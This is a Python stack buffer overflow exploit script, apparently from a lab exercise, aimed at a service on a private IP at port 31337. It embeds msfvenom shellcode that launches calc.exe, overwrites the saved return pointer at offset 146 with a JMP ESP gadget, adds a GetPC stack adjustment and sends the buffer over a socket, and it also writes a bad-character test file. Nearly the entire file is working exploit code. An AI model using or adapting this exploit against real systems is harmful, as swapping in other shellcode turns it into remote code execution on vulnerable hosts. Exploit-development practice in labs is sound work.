from socket import socket, SOCK_STREAM, AF_INET
from struct import pack

# pop calc shellcode
# msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name shellcode_calc CMD=calc.exe
def get_shellcode():
    shellcode_calc =  b""
    shellcode_calc += b"\xda\xc3\xd9\x74\x24\xf4\xbd\x49\x24\x98"
    shellcode_calc += b"\x2d\x5e\x31\xc9\xb1\x31\x31\x6e\x18\x83"
    shellcode_calc += b"\xc6\x04\x03\x6e\x5d\xc6\x6d\xd1\xb5\x84"
    shellcode_calc += b"\x8e\x2a\x45\xe9\x07\xcf\x74\x29\x73\x9b"
    shellcode_calc += b"\x26\x99\xf7\xc9\xca\x52\x55\xfa\x59\x16"
    shellcode_calc += b"\x72\x0d\xea\x9d\xa4\x20\xeb\x8e\x95\x23"
    shellcode_calc += b"\x6f\xcd\xc9\x83\x4e\x1e\x1c\xc5\x97\x43"
    shellcode_calc += b"\xed\x97\x40\x0f\x40\x08\xe5\x45\x59\xa3"
    shellcode_calc += b"\xb5\x48\xd9\x50\x0d\x6a\xc8\xc6\x06\x35"
    shellcode_calc += b"\xca\xe9\xcb\x4d\x43\xf2\x08\x6b\x1d\x89"
    shellcode_calc += b"\xfa\x07\x9c\x5b\x33\xe7\x33\xa2\xfc\x1a"
    shellcode_calc += b"\x4d\xe2\x3a\xc5\x38\x1a\x39\x78\x3b\xd9"
    shellcode_calc += b"\x40\xa6\xce\xfa\xe2\x2d\x68\x27\x13\xe1"
    shellcode_calc += b"\xef\xac\x1f\x4e\x7b\xea\x03\x51\xa8\x80"
    shellcode_calc += b"\x3f\xda\x4f\x47\xb6\x98\x6b\x43\x93\x7b"
    shellcode_calc += b"\x15\xd2\x79\x2d\x2a\x04\x22\x92\x8e\x4e"
    shellcode_calc += b"\xce\xc7\xa2\x0c\x84\x16\x30\x2b\xea\x19"
    shellcode_calc += b"\x4a\x34\x5a\x72\x7b\xbf\x35\x05\x84\x6a"
    shellcode_calc += b"\x72\xf9\xce\x37\xd2\x92\x96\xad\x67\xff"
    shellcode_calc += b"\x28\x18\xab\x06\xab\xa9\x53\xfd\xb3\xdb"
    shellcode_calc += b"\x56\xb9\x73\x37\x2a\xd2\x11\x37\x99\xd3"
    shellcode_calc += b"\x33\x54\x7c\x40\xdf\xb5\x1b\xe0\x7a\xca"
    return shellcode_calc

RHOST = '192.168.0.100'
RPORT = 31337

s = socket(AF_INET, SOCK_STREAM)
s.connect((RHOST, RPORT))

# find bad chars
test_chars = ''
bad_chars = [0x00, 0x0A]

# generate chars not in bad_chars
for c in range(0x00, 0xFF + 1):
    if c not in bad_chars:
        test_chars += chr(c)

# write test chars to binary file
with open('test_chars.bin', 'wb') as f:
    f.write(test_chars.encode())

buf_length = 1024
srp_offset = 146 	    # stack return pointer offset obtained from msp pattern_create/offset
gadget_loc = 0x080416BF # JMP ESP instruction in program

buf = b'G' * srp_offset 			    # space before SRP
buf += pack('<I', gadget_loc) 			# overwrite srp with 4 bytes, conver to little endian
#buf += b'\x90' * 20                    # noop sled (lazy)
buf += b'\x83\xec\x10'                  # sub esp,0x10 for encoding's GetPC routine (metasm_shell.rb)
buf += get_shellcode()			        # ESP now points here (insert shellcode here)
buf += b'J' * (buf_length - len(buf)) 	# fill rest of buffer
buf += b'\n'

s.send(buf)

print('We sent: ' + buf.decode('cp437'))
